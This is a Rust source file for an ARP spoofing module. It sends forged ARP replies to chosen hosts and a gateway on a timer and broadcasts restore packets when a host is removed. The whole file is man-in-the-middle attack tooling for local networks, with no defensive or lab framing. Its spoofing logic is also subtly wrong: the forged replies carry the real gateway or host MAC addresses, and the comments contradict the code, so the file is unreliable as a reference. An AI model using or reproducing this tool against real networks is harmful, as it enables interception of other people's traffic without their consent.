use std::collections::HashSet;
use std::sync::Arc;
use std::time::Duration;
use parking_lot::Mutex;
use tokio::task;
use tokio::time::sleep;

use crate::networking::host::Host;
use crate::common::globals::*;

use pnet::{
    util::MacAddr,
    datalink::{self, Channel},
    packet::{
        arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket}, 
        ethernet::{EtherTypes, MutableEthernetPacket}, 
        Packet, MutablePacket
    },
};

pub struct ArpSpoofer {
    gateway_ip: String,
    interval: Duration,
    gateway_mac: String,
    interface_name: String,
    running: Arc<Mutex<bool>>,
    hosts: Arc<Mutex<HashSet<Host>>>,
}

impl ArpSpoofer {
    pub fn new(interface: &str, gateway_ip: &str, gateway_mac: &str) -> Self {
        Self {
            interface_name: interface.to_string(),
            gateway_ip: gateway_ip.to_string(),
            gateway_mac: gateway_mac.to_string(),
            interval: Duration::from_secs(2),
            hosts: Arc::new(Mutex::new(HashSet::new())),
            running: Arc::new(Mutex::new(false)),
        }
    }

    pub fn add(&self, host: Host) {
        let mut hosts = self.hosts.lock();
        hosts.insert(host.clone());
    }

    pub fn remove(&self, host: &Host, restore: bool) {
        let mut hosts = self.hosts.lock();
        hosts.remove(host);

        if restore {
            self.restore(host);
        }
    }

    pub fn start(&self) {
        let running = Arc::clone(&self.running);
        let hosts = Arc::clone(&self.hosts);
        let iface = self.interface_name.clone();
        let gateway_ip = self.gateway_ip.clone();
        let gateway_mac = self.gateway_mac.clone();
        let interval = self.interval;

        *running.lock() = true;

        task::spawn(async move {
            println!("ARP spoofing started on interface {}", iface);
            
            while *running.lock() {
                {
                    let cloned_hosts: Vec<Host> = hosts.lock().iter().cloned().collect();

                    for host in cloned_hosts {
                        if !*running.lock() {
                            return;
                        }

                        if let Err(e) = Self::send_spoofed_packets(
                            &iface,
                            &gateway_ip,
                            &gateway_mac,
                            &host,
                        ) {
                            eprintln!("Failed to send spoofed packets for {}: {}", host.ip, e);
                        }
                    }
                }

                sleep(interval).await;
            }
            
            println!("ARP spoofing stopped");
        });
    }

    pub fn stop(&self) {
        *self.running.lock() = false;
    }

    fn send_spoofed_packets(
        interface_name: &str, 
        gateway_ip: &str, 
        gateway_mac: &str, 
        host: &Host
    ) -> Result<(), Box<dyn std::error::Error>> {
        let interface = datalink::interfaces()
            .into_iter()
            .find(|iface| iface.name == interface_name)
            .ok_or_else(|| format!("Interface {} not found", interface_name))?;

        let (mut tx, _) = match datalink::channel(&interface, Default::default())
            .map_err(|e| format!("Failed to create channel: {}", e))? {
            Channel::Ethernet(tx, rx) => (tx, rx),
            _ => return Err("Failed to create ethernet channel".into()),
        };

        let mut buffer = [0u8; 42];

        // Parse MAC addresses
        let gateway_mac_addr = gateway_mac.parse::<MacAddr>()
            .map_err(|e| format!("Invalid gateway MAC address {}: {}", gateway_mac, e))?;
        let host_mac_addr = host.mac.parse::<MacAddr>()
            .map_err(|e| format!("Invalid host MAC address {}: {}", host.mac, e))?;

        // Parse IP addresses
        let gateway_ip_addr: std::net::Ipv4Addr = gateway_ip.parse()
            .map_err(|e| format!("Invalid gateway IP address {}: {}", gateway_ip, e))?;
        let host_ip_addr: std::net::Ipv4Addr = host.ip.parse()
            .map_err(|e| format!("Invalid host IP address {}: {}", host.ip, e))?;

        // Host pretending to be gateway (tell host that gateway is at host's MAC)
        {
            let mut eth_packet = MutableEthernetPacket::new(&mut buffer)
                .ok_or("Failed to create ethernet packet")?;
            eth_packet.set_destination(host_mac_addr);
            eth_packet.set_source(gateway_mac_addr);
            eth_packet.set_ethertype(EtherTypes::Arp);

            let mut arp_packet = MutableArpPacket::new(eth_packet.payload_mut())
                .ok_or("Failed to create ARP packet")?;
            arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
            arp_packet.set_protocol_type(EtherTypes::Ipv4);
            arp_packet.set_hw_addr_len(6);
            arp_packet.set_proto_addr_len(4);
            arp_packet.set_operation(ArpOperations::Reply);
            arp_packet.set_sender_hw_addr(gateway_mac_addr);
            arp_packet.set_sender_proto_addr(gateway_ip_addr);
            arp_packet.set_target_hw_addr(host_mac_addr);
            arp_packet.set_target_proto_addr(host_ip_addr);

            tx.send_to(eth_packet.packet(), None)
                .ok_or_else(|| "Failed to send packet to host".to_string())?;
        }

        // Gateway pretending to be host (tell gateway that host is at gateway's MAC)
        {
            let mut eth_packet = MutableEthernetPacket::new(&mut buffer)
                .ok_or("Failed to create ethernet packet")?;
            eth_packet.set_destination(gateway_mac_addr);
            eth_packet.set_source(host_mac_addr);
            eth_packet.set_ethertype(EtherTypes::Arp);

            let mut arp_packet = MutableArpPacket::new(eth_packet.payload_mut())
                .ok_or("Failed to create ARP packet")?;
            arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
            arp_packet.set_protocol_type(EtherTypes::Ipv4);
            arp_packet.set_hw_addr_len(6);
            arp_packet.set_proto_addr_len(4);
            arp_packet.set_operation(ArpOperations::Reply);
            arp_packet.set_sender_hw_addr(host_mac_addr);
            arp_packet.set_sender_proto_addr(host_ip_addr);
            arp_packet.set_target_hw_addr(gateway_mac_addr);
            arp_packet.set_target_proto_addr(gateway_ip_addr);

            tx.send_to(eth_packet.packet(), None)
                .ok_or_else(|| "Failed to send packet to gateway".to_string())?;
        }

        Ok(())
    }

    fn restore(&self, host: &Host) {
        println!("Restoring ARP table for host {}", host.ip);
        
        for i in 0..3 {
            if let Err(e) = Self::send_restore_packet(
                &self.interface_name, 
                &self.gateway_ip, 
                &self.gateway_mac, 
                host
            ) {
                eprintln!("Failed to send restore packet {} for {}: {}", i + 1, host.ip, e);
            }
            
            // Small delay between restore packets
            std::thread::sleep(Duration::from_millis(100));
        }
    }

    fn send_restore_packet(
        interface_name: &str, 
        gateway_ip: &str, 
        gateway_mac: &str, 
        host: &Host
    ) -> Result<(), Box<dyn std::error::Error>> {
        let interface = datalink::interfaces()
            .into_iter()
            .find(|iface| iface.name == interface_name)
            .ok_or_else(|| format!("Interface {} not found", interface_name))?;

        let (mut tx, _) = match datalink::channel(&interface, Default::default())
            .map_err(|e| format!("Failed to create channel: {}", e))? {
            Channel::Ethernet(tx, rx) => (tx, rx),
            _ => return Err("Failed to create ethernet channel".into()),
        };

        let mut buffer = [0u8; 42];

        // Parse MAC addresses
        let gateway_mac_addr = gateway_mac.parse::<MacAddr>()
            .map_err(|e| format!("Invalid gateway MAC address {}: {}", gateway_mac, e))?;
        let host_mac_addr = host.mac.parse::<MacAddr>()
            .map_err(|e| format!("Invalid host MAC address {}: {}", host.mac, e))?;
        let broadcast_mac = MacAddr::broadcast();

        // Parse IP addresses
        let gateway_ip_addr: std::net::Ipv4Addr = gateway_ip.parse()
            .map_err(|e| format!("Invalid gateway IP address {}: {}", gateway_ip, e))?;
        let host_ip_addr: std::net::Ipv4Addr = host.ip.parse()
            .map_err(|e| format!("Invalid host IP address {}: {}", host.ip, e))?;

        // Send broadcast ARP reply to restore gateway's real MAC
        {
            let mut eth_packet = MutableEthernetPacket::new(&mut buffer)
                .ok_or("Failed to create ethernet packet")?;
            eth_packet.set_destination(broadcast_mac);
            eth_packet.set_source(gateway_mac_addr);
            eth_packet.set_ethertype(EtherTypes::Arp);

            let mut arp_packet = MutableArpPacket::new(eth_packet.payload_mut())
                .ok_or("Failed to create ARP packet")?;
            arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
            arp_packet.set_protocol_type(EtherTypes::Ipv4);
            arp_packet.set_hw_addr_len(6);
            arp_packet.set_proto_addr_len(4);
            arp_packet.set_operation(ArpOperations::Reply);
            arp_packet.set_sender_hw_addr(gateway_mac_addr);
            arp_packet.set_sender_proto_addr(gateway_ip_addr);
            arp_packet.set_target_hw_addr(broadcast_mac);
            arp_packet.set_target_proto_addr(gateway_ip_addr);

            tx.send_to(eth_packet.packet(), None)
                .ok_or_else(|| "Failed to send restore packet for gateway".to_string())?;
        }

        // Send broadcast ARP reply to restore host's real MAC
        {
            let mut eth_packet = MutableEthernetPacket::new(&mut buffer)
                .ok_or("Failed to create ethernet packet")?;
            eth_packet.set_destination(broadcast_mac);
            eth_packet.set_source(host_mac_addr);
            eth_packet.set_ethertype(EtherTypes::Arp);

            let mut arp_packet = MutableArpPacket::new(eth_packet.payload_mut())
                .ok_or("Failed to create ARP packet")?;
            arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
            arp_packet.set_protocol_type(EtherTypes::Ipv4);
            arp_packet.set_hw_addr_len(6);
            arp_packet.set_proto_addr_len(4);
            arp_packet.set_operation(ArpOperations::Reply);
            arp_packet.set_sender_hw_addr(host_mac_addr);
            arp_packet.set_sender_proto_addr(host_ip_addr);
            arp_packet.set_target_hw_addr(broadcast_mac);
            arp_packet.set_target_proto_addr(host_ip_addr);

            tx.send_to(eth_packet.packet(), None)
                .ok_or_else(|| "Failed to send restore packet for host".to_string())?;
        }

        Ok(())
    }
}